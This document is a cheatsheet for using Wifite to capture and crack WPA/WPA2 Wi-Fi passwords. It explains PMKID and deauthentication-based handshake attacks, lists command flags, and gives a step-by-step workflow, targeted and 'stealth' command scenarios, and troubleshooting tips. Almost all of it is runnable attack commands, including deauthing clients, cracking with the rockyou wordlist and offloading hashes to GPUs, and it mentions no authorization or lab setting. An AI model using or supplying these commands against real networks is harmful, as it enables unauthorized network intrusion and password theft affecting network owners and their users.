1. Objective

Automate the capture and cracking of WPA/WPA2 Wi-Fi passwords with minimal manual command entry.

2. Primary Attack Vectors (WPA/WPA2)

Attack Description Client Required?
PMKID Attack Fetches the PMKID directly from the AP without deauthing. ❌ No (Clientless)
Handshake Capture Deauthenticates connected clients to force a 4-way handshake reconnection. ✅ Yes

Note: Wifite prioritizes the PMKID attack first (faster, quieter) and falls back to handshake capture if PMKID fails.

3. Prerequisites

  • OS: Kali Linux / Parrot OS (preferred).
  • Hardware: Wi-Fi adapter supporting Monitor Mode & Packet Injection (e.g., ALFA AWUS036ACH).
  • Dependencies: aircrack-ng, reaver, tshark, pyrit (installed automatically with Wifite on Kali).

4. Installation

(Pre-installed on Kali. Manual install if missing)

$ sudo apt update
$ sudo apt install wifite -y

5. Core Command Structure

Base Command (Target WPA/WPA2 only):

$ sudo wifite --wpa

6. Command Flags & Options (Cheatsheet Table)

Flag Function Example
--wpa Target only WPA/WPA2 networks (ignores WEP/WPS). sudo wifite --wpa
-b <BSSID> Target a specific AP by MAC address. -b AA:BB:CC:DD:EE:FF
-e <ESSID> Target a specific AP by network name (SSID). -e "Home_Network"
--dict <path> Use a custom wordlist for cracking. --dict /usr/share/wordlists/rockyou.txt
--skip-crack Capture the handshake/PMKID only, do not crack. --skip-crack
--nodeauths Passive mode – never deauth clients (PMKID only). --nodeauths
--kill Automatically stop interfering services (NetworkManager). --kill
--new-hs Ignore old handshakes; force a fresh capture. --new-hs
-wpat <sec> Set timeout for WPA attack (default: 500s). -wpat 300
--dual-interface Use two Wi-Fi cards for faster scanning/capturing. --dual-interface

7. Step-by-Step Execution Workflow

Step Action Command
1 Launch Wifite targeting WPA only. sudo wifite --wpa
2 Wait for scan – Wifite lists all visible WPA APs with numbers (e.g., [1], [2]). (Automatic)
3 Select target(s) – Type the number(s) separated by commas (e.g., 1,3). 1
4 PMKID Attempt – Wifite tries to extract PMKID silently. (Automatic)
5 Handshake Attempt – If PMKID fails, Wifite deauths clients to capture handshake. (Automatic)
6 Cracking – Wifite automatically runs the hash against the default wordlist (or your custom one). (Automatic)
7 Result – Cracked password is displayed on screen and saved to a log file. View with cat ~/handshakes/

8. Advanced Usage Scenarios

Scenario A: Target Specific Router (BSSID) with Custom Wordlist

$ sudo wifite --wpa -b 11:22:33:44:55:66 --dict /usr/share/wordlists/rockyou.txt --kill

Scenario B: Passive Capturing (No Deauth – Quiet/Stealth Mode)

$ sudo wifite --wpa --nodeauths

Scenario C: Capture Only (Crack Later on a GPU Machine)

$ sudo wifite --wpa -b 11:22:33:44:55:66 --skip-crack

The captured .cap or .hccapx file is saved in ~/handshakes/ for later use.

9. Troubleshooting Tips

Problem Solution
"No targets found" Ensure the adapter is plugged in and recognized (iwconfig). Move closer to the AP.
Interface errors Use the --kill flag to stop conflicting services.
Handshake not capturing Increase attack time using -wpat 600 (10 minutes). Ensure clients are connected.
Hashcat "No device found" VM lacks GPU passthrough. Copy the captured hash to a physical Windows/Linux machine for cracking.
